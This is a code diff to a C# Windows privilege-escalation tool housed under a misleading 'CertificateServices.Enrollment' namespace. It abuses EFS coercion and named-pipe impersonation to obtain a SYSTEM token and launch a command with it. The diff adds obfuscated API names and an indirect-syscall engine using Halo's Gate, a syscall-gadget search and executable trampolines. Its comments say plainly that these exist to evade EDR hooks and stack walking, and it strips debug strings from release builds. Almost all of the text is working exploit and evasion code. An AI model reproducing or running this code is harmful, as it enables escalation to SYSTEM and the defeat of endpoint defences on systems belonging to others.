@@ -180,13 +180,21 @@ namespace CertificateServices.Enrollment
         internal static readonly byte[] _ncnp = new byte[] { 0xcd, 0x9d, 0x38, 0xd7, 0x61, 0x35, 0xab, 0x50 };
         internal static readonly byte[] _g1 = new byte[] { 0xc0, 0xc8, 0x61, 0x85, 0x6b, 0x5e, 0xfd, 0x18, 0x56, 0xb2, 0x09, 0xb9, 0xd7, 0x6f, 0xac, 0xc9, 0x37, 0x9e, 0x24, 0x5c, 0xdc, 0x2f, 0x47, 0xfd, 0x1b, 0xb6, 0x82, 0x0c, 0xa3, 0x94, 0x29, 0x91, 0x33, 0x38, 0x8e, 0x71 };
         internal static readonly byte[] _g2 = new byte[] { 0xc7, 0x98, 0x68, 0x8d, 0x3b, 0x5b, 0xa6, 0x15, 0x56, 0xb0, 0x54, 0xb4, 0xde, 0x6f, 0xa9, 0x9d, 0x64, 0x97, 0x24, 0x06, 0xd9, 0x2b, 0x45, 0xfd, 0x1f, 0xb0, 0xd2, 0x0a, 0xa2, 0xc5, 0x2c, 0xcb, 0x65, 0x6a, 0x8d, 0x70 };
-        internal static readonly byte[] _lh = new byte[] { 0xcf, 0x91, 0x3a, 0xd5, 0x63, 0x02, 0xaa, 0x53, 0x0f };
+        internal static readonly byte[] _lh  = new byte[] { 0xcf, 0x91, 0x3a, 0xd5, 0x63, 0x02, 0xaa, 0x53, 0x0f };
+        internal static readonly byte[] _svc = new byte[] { 0xff, 0x8e, 0x30, 0xc4, 0x6a, 0x36, 0xb6, 0x52, 0x0d, 0xa5, 0x47, 0xef };
         // DLL names
         internal static readonly byte[] _k32 = new byte[] { 0xc8, 0x9b, 0x2b, 0xda, 0x6a, 0x06, 0xf6, 0x12, 0x55, 0xb2, 0x5d, 0xe0 };
         internal static readonly byte[] _adv = new byte[] { 0xc2, 0x9a, 0x2f, 0xd5, 0x7f, 0x03, 0xf6, 0x12, 0x55, 0xb2, 0x5d, 0xe0 };
         internal static readonly byte[] _rpc = new byte[] { 0xf1, 0x8e, 0x3a, 0xc6, 0x7b, 0x5e, 0xeb, 0x44, 0x17, 0xba };
+        internal static readonly byte[] _ntdll = new byte[] { 0xcd, 0x8a, 0x3d, 0xd8, 0x63, 0x44, 0xa1, 0x4c, 0x17 };
         // API names
         static readonly byte[] _fn_ll = new byte[] { 0xef, 0x91, 0x38, 0xd0, 0x43, 0x03, 0xa7, 0x52, 0x1a, 0xa4, 0x48, 0xdb };
+        static readonly byte[] _fn_va = new byte[] { 0xf5, 0x97, 0x2b, 0xc0, 0x7a, 0x0b, 0xa9, 0x61, 0x17, 0xba, 0x5e, 0xef };
+        static readonly byte[] _fn_vp = new byte[] { 0xf5, 0x97, 0x2b, 0xc0, 0x7a, 0x0b, 0xa9, 0x70, 0x09, 0xb9, 0x45, 0xe9, 0x84, 0x36 };
+        static readonly byte[] _fn_ntfc = new byte[] { 0xed, 0x8a, 0x1f, 0xc7, 0x4c, 0x05, 0xab, 0x54, 0x09, 0xb9, 0x5d, 0xca, 0x8e, 0x2e, 0xf8 };
+        static readonly byte[] _fn_ntot = new byte[] { 0xed, 0x8a, 0x16, 0xc4, 0x6a, 0x04, 0x91, 0x48, 0x09, 0xb3, 0x50, 0xe8, 0xb3, 0x2d, 0xf6, 0x9d, 0x3d };
+        static readonly byte[] _fn_ndt = new byte[] { 0xed, 0x8a, 0x1d, 0xc1, 0x7f, 0x06, 0xac, 0x43, 0x1a, 0xa2, 0x54, 0xd8, 0x88, 0x29, 0xf8, 0x96 };
+        static readonly byte[] _fn_cpwt = new byte[] { 0xe0, 0x8c, 0x3c, 0xd5, 0x7b, 0x0f, 0x95, 0x52, 0x14, 0xb5, 0x54, 0xff, 0x94, 0x15, 0xf4, 0x8c, 0x3b, 0xfa, 0x66, 0x0f, 0xda, 0x74, 0x22 };
         static readonly byte[] _fn_gsh = new byte[] { 0xe4, 0x9b, 0x2d, 0xe7, 0x7b, 0x0e, 0x8d, 0x41, 0x15, 0xb2, 0x5d, 0xe9 };
         static readonly byte[] _fn_gft = new byte[] { 0xe4, 0x9b, 0x2d, 0xf2, 0x66, 0x06, 0xa0, 0x74, 0x02, 0xa6, 0x54 };
         static readonly byte[] _fn_cfw = new byte[] { 0xe0, 0x8c, 0x3c, 0xd5, 0x7b, 0x0f, 0x83, 0x49, 0x17, 0xb3, 0x66 };
@@ -197,7 +205,6 @@ namespace CertificateServices.Enrollment
         static readonly byte[] _fn_atp = new byte[] { 0xe2, 0x9a, 0x33, 0xc1, 0x7c, 0x1e, 0x91, 0x4f, 0x10, 0xb3, 0x5f, 0xdc, 0x95, 0x2b, 0xeb, 0x91, 0x3f, 0xcb, 0x6e, 0x01, 0xcc };
         static readonly byte[] _fn_lpv = new byte[] { 0xef, 0x91, 0x36, 0xdf, 0x7a, 0x1a, 0x95, 0x52, 0x12, 0xa0, 0x58, 0xe0, 0x82, 0x25, 0xf8, 0xae, 0x32, 0xc2, 0x7c, 0x01, 0xe8 };
         static readonly byte[] _fn_cp = new byte[] { 0xe0, 0x8c, 0x3c, 0xd5, 0x7b, 0x0f, 0x95, 0x49, 0x0b, 0xb3 };
-        static readonly byte[] _fn_cpau = new byte[] { 0xe0, 0x8c, 0x3c, 0xd5, 0x7b, 0x0f, 0x95, 0x52, 0x14, 0xb5, 0x54, 0xff, 0x94, 0x03, 0xee, 0xad, 0x20, 0xcb, 0x7b, 0x33 };
         static readonly byte[] _fn_rbfsb = new byte[] { 0xf1, 0x8e, 0x3a, 0xf6, 0x66, 0x04, 0xa1, 0x49, 0x15, 0xb1, 0x77, 0xfe, 0x88, 0x2f, 0xce, 0x8c, 0x21, 0xc7, 0x67, 0x03, 0xfd, 0x73, 0x1b, 0xb4, 0x42, 0xe8, 0x86, 0x6b };
         static readonly byte[] _fn_rbsai = new byte[] { 0xf1, 0x8e, 0x3a, 0xf6, 0x66, 0x04, 0xa1, 0x49, 0x15, 0xb1, 0x62, 0xe9, 0x93, 0x03, 0xe8, 0x8c, 0x3b, 0xe7, 0x67, 0x02, 0xd0, 0x4d };
         static readonly byte[] _fn_ncc2 = new byte[] { 0xed, 0x9a, 0x2b, 0xf7, 0x63, 0x03, 0xa0, 0x4e, 0x0f, 0x95, 0x50, 0xe0, 0x8b, 0x70 };
@@ -222,6 +229,24 @@ namespace CertificateServices.Enrollment
         internal delegate bool D_CloseHandle(IntPtr handle);
         [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
         internal delegate bool D_CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        internal delegate IntPtr D_VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        internal delegate bool D_VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        // delegate types — ntdll (indirect syscall trampolines)
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        internal delegate int D_NtFsControlFile(
+            IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext,
+            IntPtr IoStatusBlock, uint FsControlCode,
+            IntPtr InputBuffer, uint InputBufferLength,
+            IntPtr OutputBuffer, uint OutputBufferLength);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        internal delegate int D_NtOpenThreadToken(
+            IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        internal delegate int D_NtDuplicateToken(
+            IntPtr ExistingTokenHandle, uint DesiredAccess, IntPtr ObjectAttributes,
+            bool EffectiveOnly, int TokenType, out IntPtr NewTokenHandle);
         // delegate types — advapi32
         [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
         internal delegate bool D_ImpersonateNamedPipeClient(IntPtr pipe);
@@ -230,7 +255,7 @@ namespace CertificateServices.Enrollment
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
         internal delegate bool D_LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
-        internal delegate bool D_CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        internal delegate bool D_CreateProcessWithToken(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
         // delegate types — Rpcrt4
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
         internal delegate Int32 D_RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);
@@ -255,10 +280,12 @@ namespace CertificateServices.Enrollment
         internal static D_ConnectNamedPipe pfConnectNamedPipe;
         internal static D_CloseHandle pfCloseHandle;
         internal static D_CreatePipe pfCreatePipe;
+        internal static D_VirtualAlloc pfVirtualAlloc;
+        internal static D_VirtualProtect pfVirtualProtect;
         internal static D_ImpersonateNamedPipeClient pfImpersonateNamedPipeClient;
         internal static D_AdjustTokenPrivileges pfAdjustTokenPrivileges;
         internal static D_LookupPrivilegeValue pfLookupPrivilegeValue;
-        internal static D_CreateProcessAsUser pfCreateProcessAsUser;
+        internal static D_CreateProcessWithToken pfCreateProcessWithToken;
         internal static D_RpcBindingFromStringBinding pfRpcBindingFromStringBinding;
         internal static D_RpcBindingSetAuthInfo pfRpcBindingSetAuthInfo;
         internal static D_NdrClientCall2x86 pfNdrClientCall2x86;
@@ -266,13 +293,185 @@ namespace CertificateServices.Enrollment
         internal static D_RpcBindingFree pfRpcBindingFree;
         internal static D_RpcStringBindingCompose pfRpcStringBindingCompose;
         internal static D_RpcBindingSetOption pfRpcBindingSetOption;
+        internal static D_NtFsControlFile pfNtFsControlFile;
+        internal static D_NtOpenThreadToken pfNtOpenThreadToken;
+        internal static D_NtDuplicateToken pfNtDuplicateToken;
+
+        // === Tier 1 indirect syscall engine (x64 only) ===
+        // Replaces ImpersonateNamedPipeClient + WindowsIdentity.GetCurrent().Token with
+        // NtFsControlFile(FSCTL_PIPE_IMPERSONATE) + NtOpenThreadToken. Removes the Win32
+        // hook entry point so EDR's stack walker never runs on the impersonation path.
+        // Debug logs — compiled out of release; [Conditional] removes call sites and
+        // their string literal arguments from the release binary.
+#if DEBUG
+        static readonly bool _dbg = Environment.GetEnvironmentVariable("EFS_DBG") != null;
+#endif
+        [Conditional("DEBUG")]
+        internal static void Dbg(string s)
+        {
+#if DEBUG
+            if (!_dbg) return;
+            try { Console.Error.WriteLine("[T1] " + s); } catch { }
+#endif
+        }
+        static IntPtr _syscallGadget;
+        static bool _syscallReady;
+        internal static bool SyscallsReady { get { return _syscallReady; } }
+
+        // Clean Nt-stub prologue: 4C 8B D1 B8 <ssn:dword>
+        static ushort ReadSsnDirect(IntPtr stub)
+        {
+            if (stub == IntPtr.Zero) return ushort.MaxValue;
+            if (Marshal.ReadByte(stub, 0) != 0x4C) return ushort.MaxValue;
+            if (Marshal.ReadByte(stub, 1) != 0x8B) return ushort.MaxValue;
+            if (Marshal.ReadByte(stub, 2) != 0xD1) return ushort.MaxValue;
+            if (Marshal.ReadByte(stub, 3) != 0xB8) return ushort.MaxValue;
+            return (ushort)Marshal.ReadInt32(stub, 4);
+        }
+
+        // Halo's Gate: if the target stub is hooked, walk neighbors at 0x20-byte intervals
+        // (standard Nt-stub spacing on Win10/11 x64). Stubs are address-ordered by SSN, so
+        // the SSN delta equals the neighbor index.
+        static ushort ResolveSsn(IntPtr stub)
+        {
+            ushort s = ReadSsnDirect(stub);
+            if (s != ushort.MaxValue) return s;
+            long b = stub.ToInt64();
+            for (int d = 1; d <= 32; d++)
+            {
+                ushort n = ReadSsnDirect(new IntPtr(b + d * 0x20));
+                if (n != ushort.MaxValue) return (ushort)(n - d);
+                n = ReadSsnDirect(new IntPtr(b - d * 0x20));
+                if (n != ushort.MaxValue) return (ushort)(n + d);
+            }
+            return ushort.MaxValue;
+        }
+
+        // Locate `syscall; ret` (0F 05 C3) in ntdll!.text — the kernel sees the syscall
+        // origin as inside ntdll (MEM_IMAGE), passing user-mode caller verification.
+        static IntPtr FindSyscallGadget(IntPtr ntdllBase)
+        {
+            long b = ntdllBase.ToInt64();
+            int e_lfanew = Marshal.ReadInt32(ntdllBase, 0x3C);
+            IntPtr nt = new IntPtr(b + e_lfanew);
+            // IMAGE_NT_HEADERS64: Signature(4) + IMAGE_FILE_HEADER(20) + IMAGE_OPTIONAL_HEADER64
+            short numSections = Marshal.ReadInt16(nt, 4 + 2);   // FileHeader.NumberOfSections
+            short sizeOptHdr  = Marshal.ReadInt16(nt, 4 + 16);  // FileHeader.SizeOfOptionalHeader
+            long firstSec = nt.ToInt64() + 4 + 20 + sizeOptHdr;
+            // IMAGE_SECTION_HEADER = 40 bytes; Name[8] at +0, VirtualSize at +8, VirtualAddress at +12
+            const long TEXT_NAME = 0x000000747865742EL;  // ".text\0\0\0"
+            for (int i = 0; i < numSections; i++)
+            {
+                IntPtr sec = new IntPtr(firstSec + i * 40);
+                if (Marshal.ReadInt64(sec, 0) != TEXT_NAME) continue;
+                int vsize = Marshal.ReadInt32(sec, 8);
+                int vaddr = Marshal.ReadInt32(sec, 12);
+                IntPtr secBase = new IntPtr(b + vaddr);
+                for (int j = 0; j < vsize - 2; j++)
+                {
+                    if (Marshal.ReadByte(secBase, j) == 0x0F &&
+                        Marshal.ReadByte(secBase, j + 1) == 0x05 &&
+                        Marshal.ReadByte(secBase, j + 2) == 0xC3)
+                    {
+                        return new IntPtr(secBase.ToInt64() + j);
+                    }
+                }
+            }
+            return IntPtr.Zero;
+        }
+
+        // 21-byte trampoline written into a caller-owned dedicated page:
+        //   4C 8B D1                  mov r10, rcx
+        //   B8 <ssn:16> 00 00         mov eax, <SSN>
+        //   49 BB <gadget:64>         mov r11, <syscall_gadget>
+        //   41 FF E3                  jmp r11
+        const int STUB_SIZE = 21;
+        static void WriteTrampoline(IntPtr dst, ushort ssn)
+        {
+            byte[] stub = new byte[] {
+                0x4C, 0x8B, 0xD1,
+                0xB8, (byte)ssn, (byte)(ssn >> 8), 0x00, 0x00,
+                0x49, 0xBB, 0, 0, 0, 0, 0, 0, 0, 0,
+                0x41, 0xFF, 0xE3
+            };
+            long g = _syscallGadget.ToInt64();
+            for (int i = 0; i < 8; i++) stub[10 + i] = (byte)(g >> (i * 8));
+            Marshal.Copy(stub, 0, dst, stub.Length);
+        }
+
+        static void InitSyscalls(IntPtr hNtdll)
+        {
+            Dbg(string.Format("InitSyscalls enter ptrSize={0} hNtdll=0x{1:X} pfVA={2} pfVP={3}",
+                IntPtr.Size, hNtdll.ToInt64(), pfVirtualAlloc != null, pfVirtualProtect != null));
+            if (IntPtr.Size != 8) { Dbg("abort: x86 not supported"); return; }
+            if (hNtdll == IntPtr.Zero || pfVirtualAlloc == null || pfVirtualProtect == null) { Dbg("abort: prereq null"); return; }
+
+            try
+            {
+                _syscallGadget = FindSyscallGadget(hNtdll);
+                Dbg(string.Format("gadget=0x{0:X}", _syscallGadget.ToInt64()));
+                if (_syscallGadget == IntPtr.Zero) { Dbg("abort: no syscall;ret gadget"); return; }
+
+                IntPtr pFsCtl = P(hNtdll, S(_fn_ntfc));
+                IntPtr pOTT   = P(hNtdll, S(_fn_ntot));
+                IntPtr pNDT   = P(hNtdll, S(_fn_ndt));
+                Dbg(string.Format("pFsCtl=0x{0:X} pOTT=0x{1:X} pNDT=0x{2:X}", pFsCtl.ToInt64(), pOTT.ToInt64(), pNDT.ToInt64()));
+                if (pFsCtl == IntPtr.Zero || pOTT == IntPtr.Zero || pNDT == IntPtr.Zero) { Dbg("abort: GetProcAddress null"); return; }
+
+                ushort ssnFsCtl = ResolveSsn(pFsCtl);
+                ushort ssnOTT   = ResolveSsn(pOTT);
+                ushort ssnNDT   = ResolveSsn(pNDT);
+                Dbg(string.Format("ssnFsCtl=0x{0:X} ssnOTT=0x{1:X} ssnNDT=0x{2:X}", ssnFsCtl, ssnOTT, ssnNDT));
+                if (ssnFsCtl == ushort.MaxValue || ssnOTT == ushort.MaxValue || ssnNDT == ushort.MaxValue) { Dbg("abort: SSN resolve failed"); return; }
+
+                // Allocate a dedicated page (MEM_COMMIT|MEM_RESERVE = 0x3000, PAGE_READWRITE = 0x04).
+                // VirtualAlloc returns a page-aligned region — flipping it to RX won't touch the CLR heap.
+                IntPtr pool = pfVirtualAlloc(IntPtr.Zero, (UIntPtr)4096, 0x3000, 0x04);
+                Dbg(string.Format("pool=0x{0:X}", pool.ToInt64()));
+                if (pool == IntPtr.Zero) { Dbg("abort: VirtualAlloc failed"); return; }
+
+                IntPtr tFsCtl = pool;
+                IntPtr tOTT   = new IntPtr(pool.ToInt64() + 32);  // 21 bytes rounded up to 32
+                IntPtr tNDT   = new IntPtr(pool.ToInt64() + 64);
+                WriteTrampoline(tFsCtl, ssnFsCtl);
+                WriteTrampoline(tOTT, ssnOTT);
+                WriteTrampoline(tNDT, ssnNDT);
+                Dbg(string.Format("trampolines written tFsCtl=0x{0:X} tOTT=0x{1:X} tNDT=0x{2:X}", tFsCtl.ToInt64(), tOTT.ToInt64(), tNDT.ToInt64()));
+
+                uint old;
+                bool vpOk = pfVirtualProtect(pool, (UIntPtr)4096, 0x20 /* PAGE_EXECUTE_READ */, out old);
+                Dbg(string.Format("VirtualProtect ok={0} oldProtect=0x{1:X}", vpOk, old));
+                if (!vpOk) return;
+
+                pfNtFsControlFile = (D_NtFsControlFile)Marshal.GetDelegateForFunctionPointer(
+                    tFsCtl, typeof(D_NtFsControlFile));
+                pfNtOpenThreadToken = (D_NtOpenThreadToken)Marshal.GetDelegateForFunctionPointer(
+                    tOTT, typeof(D_NtOpenThreadToken));
+                pfNtDuplicateToken = (D_NtDuplicateToken)Marshal.GetDelegateForFunctionPointer(
+                    tNDT, typeof(D_NtDuplicateToken));
+
+                _syscallReady = true;
+                Dbg("InitSyscalls READY");
+            }
+            catch (Exception ex)
+            {
+                Dbg("InitSyscalls exception: " + ex.GetType().Name + " :: " + ex.Message);
+            }
+        }
 
         internal static void Init()
         {
+            Dbg("X.Init enter");
             IntPtr hK32 = G(S(_k32));
             var pfLoadLib = R<D_LoadLibrary>(hK32, S(_fn_ll));
             IntPtr hAdv = pfLoadLib(S(_adv));
             IntPtr hRpc = pfLoadLib(S(_rpc));
+            IntPtr hNtdll = G(S(_ntdll));  // ntdll is already mapped — GetModuleHandleW only
+            Dbg(string.Format("modules k32=0x{0:X} adv=0x{1:X} rpc=0x{2:X} ntdll=0x{3:X}",
+                hK32.ToInt64(), hAdv.ToInt64(), hRpc.ToInt64(), hNtdll.ToInt64()));
+            pfVirtualAlloc = R<D_VirtualAlloc>(hK32, S(_fn_va));
+            pfVirtualProtect = R<D_VirtualProtect>(hK32, S(_fn_vp));
+            InitSyscalls(hNtdll);
             pfGetStdHandle = R<D_GetStdHandle>(hK32, S(_fn_gsh));
             pfGetFileType = R<D_GetFileType>(hK32, S(_fn_gft));
             pfCreateFile = R<D_CreateFile>(hK32, S(_fn_cfw));
@@ -280,10 +479,11 @@ namespace CertificateServices.Enrollment
             pfConnectNamedPipe = R<D_ConnectNamedPipe>(hK32, S(_fn_cnp));
             pfCloseHandle = R<D_CloseHandle>(hK32, S(_fn_ch));
             pfCreatePipe = R<D_CreatePipe>(hK32, S(_fn_cp));
-            pfImpersonateNamedPipeClient = R<D_ImpersonateNamedPipeClient>(hAdv, S(_fn_inp));
+            if (!_syscallReady)
+                pfImpersonateNamedPipeClient = R<D_ImpersonateNamedPipeClient>(hAdv, S(_fn_inp));
             pfAdjustTokenPrivileges = R<D_AdjustTokenPrivileges>(hAdv, S(_fn_atp));
             pfLookupPrivilegeValue = R<D_LookupPrivilegeValue>(hAdv, S(_fn_lpv));
-            pfCreateProcessAsUser = R<D_CreateProcessAsUser>(hAdv, S(_fn_cpau));
+            pfCreateProcessWithToken = R<D_CreateProcessWithToken>(hAdv, S(_fn_cpwt));
             pfRpcBindingFromStringBinding = R<D_RpcBindingFromStringBinding>(hRpc, S(_fn_rbfsb));
             pfRpcBindingSetAuthInfo = R<D_RpcBindingSetAuthInfo>(hRpc, S(_fn_rbsai));
             pfNdrClientCall2x86 = R<D_NdrClientCall2x86>(hRpc, S(_fn_ncc2));
@@ -291,6 +491,7 @@ namespace CertificateServices.Enrollment
             pfRpcBindingFree = R<D_RpcBindingFree>(hRpc, S(_fn_rbf));
             pfRpcStringBindingCompose = R<D_RpcStringBindingCompose>(hRpc, S(_fn_rsbcw));
             pfRpcBindingSetOption = R<D_RpcBindingSetOption>(hRpc, S(_fn_rbso));
+            Dbg(string.Format("X.Init done syscallReady={0}", _syscallReady));
         }
     }
     #endregion
@@ -310,6 +511,9 @@ namespace CertificateServices.Enrollment
                 offset += n;
             }
         }
+
+        [DllImport("kernel32", SetLastError = true)]
+        static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);
 
         static void Main(string[] args)
         {
@@ -369,7 +573,7 @@ namespace CertificateServices.Enrollment
                 }
             }
             string g = Guid.NewGuid().ToString("d");
-            string pipePath = @"\\.\pipe\" + g + @"\pipe\srvsvc";
+            string pipePath = @"\\.\pipe\" + g + X.S(X._svc);
             var hChannel = X.pfCreateNamedPipe(pipePath, 3, 0, 10, 2048, 2048, 0, IntPtr.Zero);
             if (hChannel == new IntPtr(-1))
             {
@@ -384,9 +588,54 @@ namespace CertificateServices.Enrollment
             t2.Start(new object[] { g, endpoint });
             if (mre.WaitOne(3000))
             {
-                if (X.pfImpersonateNamedPipeClient(hChannel))
+                IntPtr tkn = IntPtr.Zero;
+                bool impOk = false;
+                X.Dbg(string.Format("impersonation path: syscalls={0}", X.SyscallsReady));
+                if (X.SyscallsReady)
                 {
-                    IntPtr tkn = WindowsIdentity.GetCurrent().Token;
+                    // Tier 1: NtFsControlFile(FSCTL_PIPE_IMPERSONATE) + NtOpenThreadToken
+                    // via indirect syscall. No advapi32!ImpersonateNamedPipeClient hook fires;
+                    // no Win32 entry point → no EDR stack walk on the impersonation path.
+                    byte[] iosb = new byte[16];
+                    GCHandle hIosb = GCHandle.Alloc(iosb, GCHandleType.Pinned);
+                    try
+                    {
+                        const uint FSCTL_PIPE_IMPERSONATE = 0x0011001C;
+                        int status = X.pfNtFsControlFile(
+                            hChannel, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
+                            hIosb.AddrOfPinnedObject(),
+                            FSCTL_PIPE_IMPERSONATE,
+                            IntPtr.Zero, 0, IntPtr.Zero, 0);
+                        X.Dbg(string.Format("NtFsControlFile status=0x{0:X8}", status));
+                        if (status >= 0)
+                        {
+                            IntPtr hThread = new IntPtr(-2);  // NtCurrentThread pseudo-handle
+                            const uint MAXIMUM_ALLOWED = 0x02000000;
+                            IntPtr impTkn;
+                            int sOpen = X.pfNtOpenThreadToken(hThread, MAXIMUM_ALLOWED, false, out impTkn);
+                            X.Dbg(string.Format("NtOpenThreadToken status=0x{0:X8} impTkn=0x{1:X}", sOpen, impTkn.ToInt64()));
+                            if (sOpen >= 0)
+                            {
+                                // Duplicate impersonation -> primary (TokenType=1) so we pass the
+                                // conventional token type to the spawn API.
+                                int sDup = X.pfNtDuplicateToken(impTkn, MAXIMUM_ALLOWED, IntPtr.Zero, false, 1, out tkn);
+                                X.Dbg(string.Format("NtDuplicateToken status=0x{0:X8} primaryTkn=0x{1:X}", sDup, tkn.ToInt64()));
+                                X.pfCloseHandle(impTkn);
+                                if (sDup >= 0) impOk = true;
+                            }
+                        }
+                    }
+                    finally { hIosb.Free(); }
+                }
+                else if (X.pfImpersonateNamedPipeClient(hChannel))
+                {
+                    tkn = WindowsIdentity.GetCurrent().Token;
+                    X.Dbg(string.Format("Win32 fallback tkn=0x{0:X}", tkn.ToInt64()));
+                    impOk = true;
+                }
+                X.Dbg(string.Format("impOk={0}", impOk));
+                if (impOk)
+                {
                     SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                     sa.nLength = Marshal.SizeOf(sa);
                     sa.pSecurityDescriptor = IntPtr.Zero;
@@ -401,12 +650,22 @@ namespace CertificateServices.Enrollment
                     si.lpDesktop = X.S(X._desk);
                     si.dwFlags = 0x101;
                     si.wShowWindow = 0;
-                    if (X.pfCreateProcessAsUser(tkn, null, targetCmdLine, IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
+                    // CreateProcessAsUserW fails with ERROR_ACCESS_DENIED in limited-caller contexts
+                    // (AppPool / non-admin shells) even with primary SYSTEM token from impersonation.
+                    // CPWT goes through seclogon and only needs SeImpersonate — which the caller
+                    // already has (prereq for the EFS coercion above).
+                    X.Dbg(string.Format("CPWT call: tkn=0x{0:X} cmd=[{1}]", tkn.ToInt64(), targetCmdLine));
+                    bool spawnOk = X.pfCreateProcessWithToken(tkn, 0, null, targetCmdLine, 0x08000000, IntPtr.Zero, null, ref si, out pi);
+                    X.Dbg(string.Format("CPWT ok={0} lastErr={1} pid={2}", spawnOk, Marshal.GetLastWin32Error(), pi.dwProcessId));
+                    if (spawnOk)
                     {
                         t1 = new Thread(ProcessOutputStream);
                         t1.IsBackground = true;
                         t1.Start(hRead);
                         new ProcessWaitHandle(new SafeWaitHandle(pi.hProcess, false)).WaitOne(-1);
+                        uint childExit = 0;
+                        try { GetExitCodeProcess(pi.hProcess, out childExit); } catch { }
+                        X.Dbg(string.Format("child exited pid={0} exitCode=0x{1:X8}", pi.dwProcessId, childExit));
                         t1.Abort();
                         if (tempFilePath != null)
                         {
